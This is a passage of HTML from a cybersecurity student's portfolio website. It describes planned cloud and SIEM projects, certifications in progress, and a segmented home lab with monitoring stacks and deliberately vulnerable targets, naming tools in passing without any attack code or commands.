        <div class="proj-title">Lab Infrastructure as Code</div>
        <div class="proj-impact">Every config change version-controlled · zero manual setup to rebuild</div>
        <div class="proj-desc">Full IaC coverage of the home lab — Ansible playbooks provision each VM from scratch, WireGuard peer configs auto-rotate on a schedule, pfSense firewall rules deploy from YAML, and GitHub Actions commits every lab change automatically. If the host dies, the lab rebuilds from git.</div>
      </div>
      <div class="proj-arrow">↗</div>
    </a>

    <!-- ROADMAP DIVIDER -->
    <div class="proj-divider reveal">
      <span class="proj-divider-label">Roadmap — in progress &amp; planned before co-op</span>
      <div class="proj-divider-line"></div>
    </div>

    <div class="proj-row planned reveal" style="cursor:default;">
      <div>
        <div class="proj-status-tag inprogress">In Progress</div>
        <div class="proj-kicker">AWS · Terraform · CloudTrail · GuardDuty · Lambda</div>
        <div class="proj-title">Cloud Security Monitoring on AWS</div>
        <div class="proj-impact">CloudTrail → GuardDuty → SNS alert pipeline · threat detection in a live cloud environment</div>
        <div class="proj-desc">Provisioning a hardened AWS environment with Terraform: VPC with isolated subnets, CloudTrail enabled across all regions, GuardDuty threat detection, and a Lambda function that fires an SNS alert on any high-severity finding. S3 access logging with anomaly alerts. Demonstrates cloud-native security tooling alongside the on-prem lab.</div>
        <div class="proj-eta">Target: April 2026</div>
      </div>
      <div class="proj-arrow" style="opacity:.3;">↗</div>
    </div>

    <div class="proj-row planned reveal" style="cursor:default;">
      <div>
        <div class="proj-status-tag inprogress">In Progress</div>
        <div class="proj-kicker">Python · Elastic · MITRE ATT&amp;CK · STIX/TAXII</div>
        <div class="proj-title">Automated Threat Intel Enrichment Tool</div>
        <div class="proj-impact">Auto-tags IOCs against live MITRE ATT&CK · enriches alerts with context before they hit the analyst queue</div>
        <div class="proj-desc">A Python daemon that pulls IOCs from an open STIX/TAXII feed, maps them to ATT&CK techniques, and automatically annotates matching alerts in Elastic Security. Reduces manual triage by surfacing attacker context — campaign name, technique, known tools — directly in the alert. Designed to slot into the existing SOC monitoring stack.</div>
        <div class="proj-eta">Target: March 2026</div>
      </div>
      <div class="proj-arrow" style="opacity:.3;">↗</div>
    </div>

    <div class="proj-row planned reveal" style="cursor:default;">
      <div>
        <div class="proj-status-tag planned">Planned</div>
        <div class="proj-kicker">Python · Syslog · pfSense · Suricata · Elastic</div>
        <div class="proj-title">Firewall Rule Audit & Drift Detection</div>
        <div class="proj-impact">Catches unauthorized rule changes before they become incidents</div>
        <div class="proj-desc">A script that snapshots pfSense firewall rules on a schedule, diffs against the last known-good state, and ships an alert to Elastic if anything changed outside a maintenance window. Designed for the kind of infrastructure work where a config drift at 2am goes unnoticed until something breaks. Pairs with the existing IaC pipeline.</div>
        <div class="proj-eta">Target: May 2026</div>
      </div>
      <div class="proj-arrow" style="opacity:.3;">↗</div>
    </div>

    <div class="proj-row planned reveal" style="cursor:default;">
      <div>
        <div class="proj-status-tag planned">Planned</div>
        <div class="proj-kicker">Azure · Sentinel · KQL · Logic Apps</div>
        <div class="proj-title">Azure Sentinel SIEM Lab</div>
        <div class="proj-impact">Hands-on with enterprise SIEM used by most Canadian SOC teams</div>
        <div class="proj-desc">Stand up a Microsoft Sentinel workspace in Azure, ingest Windows Security Event logs, write KQL detection rules for common attack patterns (pass-the-hash, brute force, privilege escalation), and build an automated response playbook with Logic Apps. Chosen because Sentinel dominates the Canadian mid-market — the tooling employers actually use.</div>
        <div class="proj-eta">Target: June 2026</div>
      </div>
      <div class="proj-arrow" style="opacity:.3;">↗</div>
    </div>
  </div>
</section>

<!-- WHY HIRE MATTHEW -->
<section id="why">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">Why Me</span>
      <div class="s-label-line"></div>
    </div>
    <p class="why-headline reveal">What you're actually getting.</p>
    <p class="why-sub reveal">Most candidates have read the textbook. I've broken production, fixed it, and written the post-mortem.</p>
    <div class="why-grid">
      <div class="why-card reveal">
        <div class="why-card-accent"></div>
        <span class="why-num">01</span>
        <span class="why-icon">🏗</span>
        <div class="why-title">Lab-proven, not just theory</div>
        <div class="why-body">Every skill on this page was earned against a running system — <strong>18 VMs, 5 isolated VLANs, real alerts, real failures</strong>. I didn't simulate an attack; I launched one, watched Security Onion detect it, and wrote the rule.</div>
        <span class="why-proof">Verifiable on GitHub</span>
      </div>
      <div class="why-card reveal">
        <div class="why-card-accent"></div>
        <span class="why-num">02</span>
        <span class="why-icon">🔍</span>
        <div class="why-title">Thinks like a defender, operates like an attacker</div>
        <div class="why-body">Every CTF writeup ends with detection notes and a one-line fix. I don't just pop a shell — I ask <strong>"how would a SOC analyst have seen this?"</strong> and write the Sigma rule to prove it.</div>
        <span class="why-proof">CTF writeups with detection coverage</span>
      </div>
      <div class="why-card reveal">
        <div class="why-card-accent"></div>
        <span class="why-num">03</span>
        <span class="why-icon">📋</span>
        <div class="why-title">Ships documented, reviewable work</div>
        <div class="why-body">Every project exits with <strong>structured HTML reports, version-controlled configs, and reproducible builds</strong>. If the host dies, the lab rebuilds from git in minutes. That's the discipline your team needs on day one.</div>
        <span class="why-proof">IaC + Git-tracked everything</span>
      </div>
    </div>

    <!-- SKILL PROFICIENCY BARS -->
    <div class="skill-bars-section reveal">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:2rem 4rem;margin-top:3rem;">
        <div>
          <p style="font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--accent-dim);margin-bottom:1.25rem;opacity:.9;">Core Security</p>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Network Security & VLANs</span><span class="skill-bar-pct">90%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill green" data-w="90"></div></div>
          </div>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">SIEM / Log Analysis (Security Onion)</span><span class="skill-bar-pct">82%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill blue" data-w="82"></div></div>
          </div>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Incident Detection & Response</span><span class="skill-bar-pct">78%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill blue" data-w="78"></div></div>
          </div>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Penetration Testing (CTF)</span><span class="skill-bar-pct">72%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill amber" data-w="72"></div></div>
          </div>
        </div>
        <div>
          <p style="font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--accent-dim);margin-bottom:1.25rem;opacity:.9;">Infrastructure & Automation</p>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Linux Administration</span><span class="skill-bar-pct">88%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill green" data-w="88"></div></div>
          </div>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Ansible / Terraform (IaC)</span><span class="skill-bar-pct">85%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill blue" data-w="85"></div></div>
          </div>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Python / Bash Scripting</span><span class="skill-bar-pct">80%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill blue" data-w="80"></div></div>
          </div>
          <div class="skill-bar-group">
            <div class="skill-bar-label"><span class="skill-bar-name">Docker / CI-CD Pipelines</span><span class="skill-bar-pct">75%</span></div>
            <div class="skill-bar-track"><div class="skill-bar-fill amber" data-w="75"></div></div>
          </div>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- CTF -->
<section id="ctf">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">CTF Labs</span>
      <div class="s-label-line"></div>
    </div>
    <p class="reveal" style="font-size:15px;font-weight:300;color:var(--text);margin-bottom:2rem;line-height:1.85;max-width:600px;">
      Click a lab to step through the live attack chain &mdash; command run, log generated, ATT&amp;CK technique, and the detection rule that catches it. Offense and defense, side by side.
    </p>
    <div class="ctf-tabs reveal" id="ctf-tabs"></div>
    <div class="ctf-player reveal" id="ctf-player">
      <div class="ctf-player-header" id="ctf-player-header"></div>
      <div class="ctf-chain-rail" id="ctf-chain-rail"></div>
      <div class="ctf-player-body">
        <div class="ctf-log-pane">
          <div class="ctf-log-bar" id="ctf-log-bar">Attack Log</div>
          <div class="ctf-log-output" id="ctf-log-output"></div>
        </div>
        <div class="ctf-analysis-pane">
          <div class="ctf-analysis-bar">Detection Analysis</div>
          <div class="ctf-analysis-body" id="ctf-analysis-body"></div>
        </div>
      </div>
      <div class="ctf-controls">
        <button class="ctf-ctrl-btn" id="ctf-prev">← Prev</button>
        <button class="ctf-ctrl-btn primary" id="ctf-next">Next Phase →</button>
        <button class="ctf-ctrl-btn" id="ctf-replay">↺ Replay</button>
        <div class="ctf-ctrl-sep"></div>
        <span class="ctf-phase-counter" id="ctf-phase-counter"></span>
        <a class="ctf-github-link" id="ctf-github-link" href="#" target="_blank">↗ Full Writeup</a>
      </div>
    </div>
  </div>
</section>

<!-- CURRENTLY WORKING ON -->
<section id="now">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">Currently Working On</span>
      <div class="s-label-line"></div>
    </div>
    <div class="now-narrative reveal">
      <p>Three things in parallel right now: finishing the <strong>TryHackMe SOC Level 2 path</strong>, shipping the <strong>AWS cloud security project</strong> so the portfolio covers both on-prem and cloud, and pushing through the last stretch of <strong>CompTIA Security+</strong> study. Every week something new goes on GitHub.</p>
    </div>
    <div class="now-grid">
      <div class="now-item reveal">
        <div class="now-icon">⬡</div>
        <div>
          <div class="now-title">CompTIA Security+ · 62% complete</div>
          <div class="now-desc">Professor Messer's course + Darril Gibson practice exams. Exam target: Summer 2026. Domain coverage: Threats &amp; Vulnerabilities, Architecture, Implementation.</div>
        </div>
      </div>
      <div class="now-item reveal">
        <div class="now-icon">⬡</div>
        <div>
          <div class="now-title">TryHackMe SOC Level 2 · 78% complete</div>
          <div class="now-desc">Covering threat intelligence frameworks (MISP, OpenCTI), advanced log analysis with Splunk and Elastic, malware analysis fundamentals, and digital forensics.</div>
        </div>
      </div>
      <div class="now-item reveal">
        <div class="now-icon">⬡</div>
        <div>
          <div class="now-title">AWS Cloud Security Lab · in progress</div>
          <div class="now-desc">CloudTrail + GuardDuty + Lambda alert pipeline on a hardened VPC. Goal: demonstrate cloud-native detection alongside the on-prem SOC stack. Target: April 2026.</div>
        </div>
      </div>
      <div class="now-item reveal">
        <div class="now-icon">⬡</div>
        <div>
          <div class="now-title">Threat Intel Enrichment Tool · in progress</div>
          <div class="now-desc">Python daemon pulling from a STIX/TAXII feed, mapping IOCs to ATT&CK, annotating Elastic alerts automatically. Makes the SOC stack smarter without adding analyst workload.</div>
        </div>
      </div>
      <div class="now-item reveal">
        <div class="now-icon">⬡</div>
        <div>
          <div class="now-title">HackTheBox writeups · 2 queued</div>
          <div class="now-desc">HTB Active (GPP creds + Kerberoasting) and HTB Lame (legacy service exploitation). Both include Suricata/Sigma detection rules — offensive work that pays off defensively.</div>
        </div>
      </div>
      <div class="now-item reveal">
        <div class="now-icon">⬡</div>
        <div>
          <div class="now-title">Homelab → GitHub Automated Sync</div>
          <div class="now-desc">A GitHub Actions pipeline that commits config changes and new scripts from the lab automatically. Keeps the portfolio current without a manual push every time.</div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- LAB DIAGRAM -->
<section id="lab">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">Home Lab Architecture</span>
      <div class="s-label-line"></div>
    </div>
    <p class="reveal" style="font-size:15px;font-weight:300;color:var(--text);margin-bottom:1.5rem;line-height:1.85;max-width:640px;">
      A segmented virtual lab environment running on VMware Workstation. One isolated VLAN per security zone, all traffic routing through pfSense, with Security Onion passively sniffing the SPAN port. <span style="font-family:var(--mono);font-size:11px;color:var(--text);opacity:.7;">Click any node to inspect.</span>
    </p>

    <!-- LAB STAT STRIP -->
    <div class="lab-stats reveal">
      <div class="lab-stat"><span class="lab-stat-n">18</span><span class="lab-stat-l">live nodes</span></div>
      <div class="lab-stat-sep"></div>
      <div class="lab-stat"><span class="lab-stat-n">+5</span><span class="lab-stat-l">planned</span></div>
      <div class="lab-stat-sep"></div>
      <div class="lab-stat"><span class="lab-stat-n">6</span><span class="lab-stat-l">isolated VLANs</span></div>
      <div class="lab-stat-sep"></div>
      <div class="lab-stat"><span class="lab-stat-n">100%</span><span class="lab-stat-l">traffic monitored</span></div>
      <div class="lab-stat-sep"></div>
      <div class="lab-stat"><span class="lab-stat-n">IaC</span><span class="lab-stat-l">Ansible + Terraform</span></div>
    </div>

    <!-- THREAT INTEL TICKER — contextual to the lab section -->
    <div id="ticker" class="reveal">
      <div id="tlabel">THREAT INTEL</div>
      <div id="ttrack"><div id="tinner">
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21418" target="_blank" rel="noopener"><em>CVE-2025-21418</em></a> · Windows AFD Driver · CVSS <b>9.8</b> · <i>Actively Exploited</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21391" target="_blank" rel="noopener"><em>CVE-2025-21391</em></a> · Windows Storage EoP · CVSS <b>7.1</b> · <i>CISA KEV</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0282" target="_blank" rel="noopener"><em>CVE-2025-0282</em></a> · Ivanti Connect Secure · CVSS <b>9.0</b> · <i>Zero-Day</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55591" target="_blank" rel="noopener"><em>CVE-2024-55591</em></a> · FortiOS Auth Bypass · CVSS <b>9.6</b> · <i>Actively Exploited</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23006" target="_blank" rel="noopener"><em>CVE-2025-23006</em></a> · SonicWall SMA RCE · CVSS <b>9.8</b> · <i>Zero-Day</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3400" target="_blank" rel="noopener"><em>CVE-2024-3400</em></a> · PAN-OS Command Injection · CVSS <b>10.0</b> · <i>Actively Exploited</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21418" target="_blank" rel="noopener"><em>CVE-2025-21418</em></a> · Windows AFD Driver · CVSS <b>9.8</b> · <i>Actively Exploited</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21391" target="_blank" rel="noopener"><em>CVE-2025-21391</em></a> · Windows Storage EoP · CVSS <b>7.1</b> · <i>CISA KEV</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0282" target="_blank" rel="noopener"><em>CVE-2025-0282</em></a> · Ivanti Connect Secure · CVSS <b>9.0</b> · <i>Zero-Day</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-55591" target="_blank" rel="noopener"><em>CVE-2024-55591</em></a> · FortiOS Auth Bypass · CVSS <b>9.6</b> · <i>Actively Exploited</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23006" target="_blank" rel="noopener"><em>CVE-2025-23006</em></a> · SonicWall SMA RCE · CVSS <b>9.8</b> · <i>Zero-Day</i></span>
        <span class="ti"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3400" target="_blank" rel="noopener"><em>CVE-2024-3400</em></a> · PAN-OS Command Injection · CVSS <b>10.0</b> · <i>Actively Exploited</i></span>
      </div></div>
    </div>

    <!-- DESKTOP: topology diagram -->
    <div class="diagram-wrap reveal diagram-desktop" style="padding:1.5rem;position:relative;">

      <!-- SEARCH BAR -->
      <div class="topo-search-row">
        <div class="topo-search-wrap">
          <span class="topo-search-icon">⌕</span>
          <input id="topo-search" type="text" placeholder="filter nodes…" autocomplete="off" spellcheck="false">
        </div>
        <span class="topo-search-hint">or click any node</span>
      </div>

      <div id="topo">
        <!-- SVG overlay for pixel-perfect wires — drawn by JS -->
        <svg id="topo-svg" aria-hidden="true"></svg>

        <!-- INTERNET -->
        <div class="topo-internet">
          <div class="topo-internet-line"></div>
          <div class="topo-inet-label">⬡ INTERNET / WAN</div>
          <div class="topo-internet-line"></div>
        </div>

        <!-- PFSENSE HUB -->
        <div class="topo-hub-row">
          <div class="topo-connector-down from-inet"></div>
          <div class="topo-hub tnode" data-id="pfsense"
            data-title="pfSense Firewall"
            data-ip="192.168.1.1"
            data-role="Core router and firewall. All inter-VLAN traffic passes through here."
            data-body="Suricata IDS/IPS runs inline on the WAN interface. HAProxy load balances requests to DMZ services. A SPAN port mirrors all VLAN traffic to Security Onion for passive monitoring. No VM can route between VLANs without a matching firewall rule."
            data-tags="FIREWALL,NAT,IDS/IPS,HAPROXY,SPAN PORT,VLAN TRUNK"
            data-connects="All VLANs"
            data-status="online">
            <div class="topo-hub-accent"></div>
            <div class="topo-hub-inner">
              <div class="topo-hub-left">
                <div class="topo-hub-icon">🛡</div>
                <div>
                  <div class="topo-hub-name">pfSense Firewall</div>
                  <div class="topo-hub-ip">192.168.1.1 · VLAN TRUNK</div>
                  <div class="topo-hub-tags">
                    <span>FIREWALL</span><span>NAT</span><span>IDS/IPS</span><span>HAPROXY</span><span>SPAN PORT</span>
                  </div>
                </div>
              </div>
              <div class="topo-hub-right">
                <div class="topo-hub-status"><span class="topo-pulse"></span>ONLINE</div>
                <div class="topo-hub-hint">click to inspect</div>
              </div>
            </div>
          </div>
          <div class="topo-connector-down to-bus"></div>
        </div>

        <!-- BUS BAR -->
        <div class="topo-bus-row">
          <div class="topo-bus">
            <div class="topo-bus-line"></div>
          </div>
        </div>

        <!-- VLANS -->
        <div class="topo-vlans">

          <!-- VLAN 10 MGMT -->
          <div class="topo-vlan" data-vlan="mgmt" data-vlan-rate="12" data-vlan-color="#4a8fff">
            <div class="topo-vlan-header" style="--vc:#4a8fff">
              <div class="topo-vlan-header-top">
                <span class="topo-vlan-badge">VLAN 10</span>
                <span class="topo-isolation-tag" style="--ic:rgba(74,143,255,0.15);--ibc:rgba(74,143,255,0.3);color:#6a9adf">INTERNAL</span>
              </div>
              <span class="topo-vlan-name">Management</span>
            </div>
            <div class="topo-vlan-nodes">
              <div class="topo-node tnode" data-id="winserver" style="--vc:#4a8fff"
                data-title="Windows Server 2019" data-ip="192.168.10.10"
                data-role="Primary Domain Controller for the lab domain."
                data-body="Hosts Active Directory, DNS, DHCP, and Group Policy. All domain-joined VMs (Win10 WS, Nextcloud OAuth) authenticate here. Exchange Server configured for lab mail flow. GPOs enforce security baselines across endpoints."
                data-tags="Active Directory,DNS,DHCP,GPO,Exchange" data-connects="Win10 WS, Nextcloud, Ubuntu" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#4a8fff"></div>
                <div class="topo-node-icon">🖥</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Win Server 2019</div>
                  <div class="topo-node-ip">192.168.10.10</div>
                  <div class="topo-node-tags"><span>AD</span><span>DNS</span><span>DHCP</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="ubuntu" style="--vc:#4a8fff"
                data-title="Ubuntu Server 22.04" data-ip="192.168.10.20"
                data-role="Automation host and SSH jump box for the entire lab."
                data-body="Ansible playbooks provision all VMs from this host. Terraform manages infrastructure-as-code for the lab. Acts as the SSH jump box — all external admin access routes through here before reaching any other VLAN. WireGuard peer configs are managed by Ansible from this machine."
                data-tags="Ansible,Terraform,SSH Jump Box,IaC" data-connects="All VMs, WireGuard" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#4a8fff"></div>
                <div class="topo-node-icon">⚙</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Ubuntu 22.04</div>
                  <div class="topo-node-ip">192.168.10.20</div>
                  <div class="topo-node-tags"><span>ANSIBLE</span><span>TERRAFORM</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="win10" style="--vc:#4a8fff"
                data-title="Windows 10 Workstation" data-ip="192.168.10.30"
                data-role="Simulated domain-joined employee endpoint."
                data-body="Used for lateral movement practice, GPO enforcement testing, and endpoint detection exercises with Security Onion. Logs ship to Security Onion via Winlogbeat. Mimikatz and BloodHound are run from Kali against this machine during AD attack labs."
                data-tags="Endpoint,Domain Joined,RDP,Winlogbeat" data-connects="Win Server, Security Onion, Kali" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#4a8fff"></div>
                <div class="topo-node-icon">💻</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Windows 10 WS</div>
                  <div class="topo-node-ip">192.168.10.30</div>
                  <div class="topo-node-tags"><span>ENDPOINT</span><span>RDP</span></div>
                </div>
              </div>
            </div>
          </div>

          <!-- VLAN 20 SECURITY -->
          <div class="topo-vlan" data-vlan="sec" data-vlan-rate="340" data-vlan-color="#2ecc71">
            <div class="topo-vlan-header" style="--vc:#2ecc71">
              <div class="topo-vlan-header-top">
                <span class="topo-vlan-badge">VLAN 20</span>
                <span class="topo-isolation-tag" style="--ic:rgba(46,204,113,0.12);--ibc:rgba(46,204,113,0.3);color:#3ab866">MONITORING</span>
              </div>
              <span class="topo-vlan-name">Security</span>
            </div>
            <div class="topo-vlan-nodes">
              <div class="topo-node tnode" data-id="seconion" style="--vc:#2ecc71"
                data-title="Security Onion 2.4" data-ip="192.168.20.10"
                data-role="Full NSM / SIEM stack receiving all lab traffic."
                data-body="Receives mirrored traffic from pfSense span port via a dedicated network interface — sees everything. Zeek generates protocol-level logs (DNS, HTTP, TLS, SMB). Suricata fires alerts on known-bad signatures. Elastic Stack indexes all logs; Kibana dashboards visualise attack chains in real time."
                data-tags="SIEM,Zeek,Suricata,Elastic,Kibana,NSM" data-connects="pfSense span port, Docker, Win10" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">🔍</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Security Onion</div>
                  <div class="topo-node-ip">192.168.20.10</div>
                  <div class="topo-node-tags"><span>SIEM</span><span>ZEEK</span><span>ELASTIC</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="kali" style="--vc:#2ecc71"
                data-title="Kali Linux 2024" data-ip="192.168.20.20"
                data-role="Primary offensive workstation for pentesting and CTF labs."
                data-body="Full offensive toolkit: Metasploit Framework, Burp Suite Pro, Nmap, Nikto, Hashcat, BloodHound, Impacket, CrackMapExec. Attacks launched from here against VLAN 40 targets are visible in Security Onion, creating a closed-loop red/blue exercise environment."
                data-tags="Metasploit,Burp Suite,BloodHound,Impacket,Hashcat" data-connects="VLAN 40 targets, OpenVAS" data-status="active">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#f5c842"></div>
                <div class="topo-node-icon">⚔</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Kali Linux</div>
                  <div class="topo-node-ip">192.168.20.20</div>
                  <div class="topo-node-tags"><span>METASPLOIT</span><span>BURP</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="openvas" style="--vc:#2ecc71"
                data-title="OpenVAS / Greenbone" data-ip="192.168.20.30"
                data-role="Automated CVE-based vulnerability scanner."
                data-body="Runs NVT (Network Vulnerability Tests) scan policies against VLAN 40 targets on a schedule. Severity reports feed into Security Onion for correlation. Scan results are used to verify that new vulnerabilities in Metasploitable or DVWA are detectable before running manual exploits."
                data-tags="NVT Scans,CVE,Severity Reports,Greenbone" data-connects="VLAN 40, Security Onion" data-status="active">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#f5c842"></div>
                <div class="topo-node-icon">📡</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">OpenVAS</div>
                  <div class="topo-node-ip">192.168.20.30</div>
                  <div class="topo-node-tags"><span>VULN SCANNER</span><span>CVE</span></div>
                </div>
              </div>
            </div>
          </div>

          <!-- VLAN 30 MONITORING -->
          <div class="topo-vlan" data-vlan="mon" data-vlan-rate="58" data-vlan-color="#f5c842">
            <div class="topo-vlan-header" style="--vc:#f5c842">
              <div class="topo-vlan-header-top">
                <span class="topo-vlan-badge">VLAN 30</span>
                <span class="topo-isolation-tag" style="--ic:rgba(245,200,66,0.1);--ibc:rgba(245,200,66,0.3);color:#c9a020">OBSERVABILITY</span>
              </div>
              <span class="topo-vlan-name">Monitoring</span>
            </div>
            <div class="topo-vlan-nodes">
              <div class="topo-node tnode" data-id="docker" style="--vc:#f5c842"
                data-title="Docker Host (Ubuntu 22.04)" data-ip="192.168.30.10"
                data-role="Full observability stack deployed via Docker Compose."
                data-body="Runs Prometheus (metrics scraping), Grafana (dashboards), Loki (log aggregation), Promtail (log shipping), Alertmanager (alert routing), Node Exporter (host metrics), and cAdvisor (container metrics) — all in a single compose stack on an isolated Docker network with persistent volumes."
                data-tags="Prometheus,Grafana,Loki,Promtail,cAdvisor" data-connects="AlertManager, Security Onion, All VMs" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">📊</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Docker Host</div>
                  <div class="topo-node-ip">192.168.30.10</div>
                  <div class="topo-node-tags"><span>PROMETHEUS</span><span>GRAFANA</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="alertmgr" style="--vc:#f5c842"
                data-title="AlertManager + Exporters" data-ip="192.168.30.20"
                data-role="Alert deduplication, routing, and host metrics collection."
                data-body="Alertmanager handles grouping and routing of Prometheus alerts — silences, inhibition rules, and notification templates configured. Node Exporter scrapes CPU, memory, disk, and network metrics from each VM. cAdvisor exposes container resource usage from the Docker host."
                data-tags="Node Exporter,cAdvisor,Alert Routing,Inhibition" data-connects="Docker Host, Ntfy, all VMs" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">🔔</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">AlertManager</div>
                  <div class="topo-node-ip">192.168.30.20</div>
                  <div class="topo-node-tags"><span>NODE EXPORTER</span><span>LOKI</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="uptime" style="--vc:#f5c842"
                data-title="Uptime Kuma" data-ip="192.168.30.30"
                data-role="Service availability monitoring with push notifications."
                data-body="Polls all lab service endpoints every 60 seconds: HTTP/HTTPS status codes, TCP port checks, and DNS resolution. Pushes instant alerts via Ntfy when any service goes down. Status page provides a live overview of the entire lab without needing to open Grafana."
                data-tags="HTTP Monitor,TCP Check,DNS,Ntfy Alerts" data-connects="All services, Ntfy" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">💓</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Uptime Kuma</div>
                  <div class="topo-node-ip">192.168.30.30</div>
                  <div class="topo-node-tags"><span>HTTP CHECK</span><span>NTFY</span></div>
                </div>
              </div>
            </div>
          </div>

          <!-- VLAN 40 LAB -->
          <div class="topo-vlan" data-vlan="lab" data-vlan-rate="2" data-vlan-color="#ff4a5a">
            <div class="topo-vlan-header" style="--vc:#ff4a5a">
              <div class="topo-vlan-header-top">
                <span class="topo-vlan-badge">VLAN 40</span>
                <span class="topo-isolation-tag" style="--ic:rgba(255,74,90,0.12);--ibc:rgba(255,74,90,0.35);color:#cc3a48">AIRGAPPED</span>
              </div>
              <span class="topo-vlan-name">Lab / Victim</span>
            </div>
            <div class="topo-vlan-nodes">
              <div class="topo-node tnode" data-id="msf" style="--vc:#ff4a5a"
                data-title="Metasploitable 3" data-ip="192.168.40.10"
                data-role="Intentionally vulnerable Windows Server target."
                data-body="Fully unpatched Windows Server with EternalBlue (MS17-010), open Samba shares, weak service credentials, and misconfigured RDP. Firewall rules block all outbound traffic from VLAN 40 — exploits cannot pivot to other VLANs or reach the internet. Used for Metasploit module testing and post-exploitation practice."
                data-tags="EternalBlue,MS17-010,SMB,Weak Creds,No Egress" data-connects="Kali (inbound only), OpenVAS (scan)" data-status="target">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#ff4a5a"></div>
                <div class="topo-node-icon">💀</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Metasploitable 3</div>
                  <div class="topo-node-ip">192.168.40.10</div>
                  <div class="topo-node-tags"><span>VULN TARGET</span><span>MS17-010</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="dvwa" style="--vc:#ff4a5a"
                data-title="DVWA" data-ip="192.168.40.20"
                data-role="Web application vulnerability training environment."
                data-body="Damn Vulnerable Web Application — covers SQL injection, reflected/stored XSS, CSRF, file inclusion, command injection, and IDOR. Difficulty is adjustable per-module. Runs in Docker on a minimal Ubuntu host. Burp Suite from Kali is used to intercept and manipulate HTTP traffic against it."
                data-tags="SQL Injection,XSS,CSRF,File Inclusion,IDOR" data-connects="Kali (attacker), OpenVAS (scanner)" data-status="target">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#ff4a5a"></div>
                <div class="topo-node-icon">🕸</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">DVWA</div>
                  <div class="topo-node-ip">192.168.40.20</div>
                  <div class="topo-node-tags"><span>SQLi</span><span>XSS</span><span>CSRF</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="kioptrix" style="--vc:#ff4a5a"
                data-title="Kioptrix Level 1" data-ip="192.168.40.30"
                data-role="Classic VulnHub boot-to-root machine."
